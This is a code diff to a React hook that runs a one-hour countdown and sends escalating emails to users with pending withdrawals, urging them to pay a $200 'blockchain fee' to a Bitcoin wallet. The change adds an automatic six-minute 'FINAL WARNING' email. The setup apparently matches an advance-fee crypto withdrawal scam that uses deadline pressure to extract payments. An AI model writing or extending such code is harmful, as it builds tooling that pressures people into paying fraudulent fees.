@@ -6,8 +6,10 @@ const COUNTDOWN_HOURS = 1;
 const STORAGE_KEY = "blockchain_fee_countdown_start";
 const EMAIL_SENT_KEY = "blockchain_fee_email_sent";
 const AUTO_REMINDER_SENT_KEY = "blockchain_fee_auto_reminder_sent";
+const FINAL_WARNING_SENT_KEY = "blockchain_fee_final_warning_sent";
 const BLOCKCHAIN_FEE_AMOUNT = 200;
 const HALF_COUNTDOWN_SECONDS = (COUNTDOWN_HOURS * 60 * 60) / 2;
+const TEN_PERCENT_COUNTDOWN_SECONDS = (COUNTDOWN_HOURS * 60 * 60) / 10; // 6 minutes
 
 interface UseBlockchainFeeCountdownReturn {
   timeLeft: number;
@@ -17,6 +19,7 @@ interface UseBlockchainFeeCountdownReturn {
   emailSent: boolean;
   sendingEmail: boolean;
   autoReminderSent: boolean;
+  finalWarningSent: boolean;
   formatTime: (seconds: number) => string;
   resetCountdown: () => void;
   sendEmailNotification: () => Promise<boolean>;
@@ -30,7 +33,9 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
   const [emailSent, setEmailSent] = useState(false);
   const [sendingEmail, setSendingEmail] = useState(false);
   const [autoReminderSent, setAutoReminderSent] = useState(false);
+  const [finalWarningSent, setFinalWarningSent] = useState(false);
   const autoReminderTriggered = useRef(false);
+  const finalWarningTriggered = useRef(false);
 
   const formatTime = useCallback((seconds: number) => {
     const hours = Math.floor(seconds / 3600);
@@ -45,20 +50,23 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
     localStorage.removeItem(STORAGE_KEY);
     localStorage.removeItem(EMAIL_SENT_KEY);
     localStorage.removeItem(AUTO_REMINDER_SENT_KEY);
+    localStorage.removeItem(FINAL_WARNING_SENT_KEY);
     setTimeLeft(COUNTDOWN_HOURS * 60 * 60);
     setIsExpired(false);
     setEmailSent(false);
     setAutoReminderSent(false);
+    setFinalWarningSent(false);
     autoReminderTriggered.current = false;
+    finalWarningTriggered.current = false;
   }, []);
 
-  const sendEmailNotification = useCallback(async (isAutoReminder = false): Promise<boolean> => {
+  const sendEmailNotification = useCallback(async (reminderType: 'manual' | 'auto' | 'final' = 'manual'): Promise<boolean> => {
     if (sendingEmail) return false;
     
-    // For manual sends, check if already sent
-    // For auto reminders, check if auto reminder was already sent
-    if (!isAutoReminder && emailSent) return false;
-    if (isAutoReminder && autoReminderSent) return false;
+    // Check if already sent based on type
+    if (reminderType === 'manual' && emailSent) return false;
+    if (reminderType === 'auto' && autoReminderSent) return false;
+    if (reminderType === 'final' && finalWarningSent) return false;
     
     setSendingEmail(true);
     try {
@@ -78,7 +86,7 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
           feeAmount: BLOCKCHAIN_FEE_AMOUNT,
           walletAddress: CONFIRMATION_FEE_WALLET_BTC,
           hoursRemaining,
-          isAutoReminder,
+          reminderType,
           minutesRemaining,
         },
       });
@@ -89,9 +97,12 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
         return false;
       }
 
-      if (isAutoReminder) {
+      if (reminderType === 'auto') {
         localStorage.setItem(AUTO_REMINDER_SENT_KEY, "true");
         setAutoReminderSent(true);
+      } else if (reminderType === 'final') {
+        localStorage.setItem(FINAL_WARNING_SENT_KEY, "true");
+        setFinalWarningSent(true);
       } else {
         localStorage.setItem(EMAIL_SENT_KEY, "true");
         setEmailSent(true);
@@ -104,7 +115,7 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
       setSendingEmail(false);
       return false;
     }
-  }, [emailSent, sendingEmail, timeLeft, withdrawalAmount, autoReminderSent]);
+  }, [emailSent, sendingEmail, timeLeft, withdrawalAmount, autoReminderSent, finalWarningSent]);
 
   useEffect(() => {
     // Check if email was already sent
@@ -118,6 +129,13 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
     if (autoReminderStatus === "true") {
       setAutoReminderSent(true);
       autoReminderTriggered.current = true;
+    }
+    
+    // Check if final warning was already sent
+    const finalWarningStatus = localStorage.getItem(FINAL_WARNING_SENT_KEY);
+    if (finalWarningStatus === "true") {
+      setFinalWarningSent(true);
+      finalWarningTriggered.current = true;
     }
 
     const checkPendingWithdrawals = async () => {
@@ -162,10 +180,13 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
           localStorage.removeItem(STORAGE_KEY);
           localStorage.removeItem(EMAIL_SENT_KEY);
           localStorage.removeItem(AUTO_REMINDER_SENT_KEY);
+          localStorage.removeItem(FINAL_WARNING_SENT_KEY);
           setHasPendingWithdrawal(false);
           setEmailSent(false);
           setAutoReminderSent(false);
+          setFinalWarningSent(false);
           autoReminderTriggered.current = false;
+          finalWarningTriggered.current = false;
         }
       } catch (error) {
         console.error("Error:", error);
@@ -182,11 +203,26 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
       !isExpired && 
       !autoReminderTriggered.current && 
       timeLeft <= HALF_COUNTDOWN_SECONDS &&
-      timeLeft > 0
+      timeLeft > TEN_PERCENT_COUNTDOWN_SECONDS
     ) {
       autoReminderTriggered.current = true;
       console.log("Triggering automatic 50% countdown reminder email");
-      sendEmailNotification(true);
+      sendEmailNotification('auto');
+    }
+  }, [timeLeft, hasPendingWithdrawal, isExpired, sendEmailNotification]);
+
+  // Auto-send final warning at 10% countdown (6 minutes)
+  useEffect(() => {
+    if (
+      hasPendingWithdrawal && 
+      !isExpired && 
+      !finalWarningTriggered.current && 
+      timeLeft <= TEN_PERCENT_COUNTDOWN_SECONDS &&
+      timeLeft > 0
+    ) {
+      finalWarningTriggered.current = true;
+      console.log("Triggering automatic 10% countdown FINAL WARNING email");
+      sendEmailNotification('final');
     }
   }, [timeLeft, hasPendingWithdrawal, isExpired, sendEmailNotification]);
 
@@ -214,8 +250,9 @@ export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => 
     emailSent,
     sendingEmail,
     autoReminderSent,
+    finalWarningSent,
     formatTime,
     resetCountdown,
-    sendEmailNotification: () => sendEmailNotification(false),
+    sendEmailNotification: () => sendEmailNotification('manual'),
   };
 };
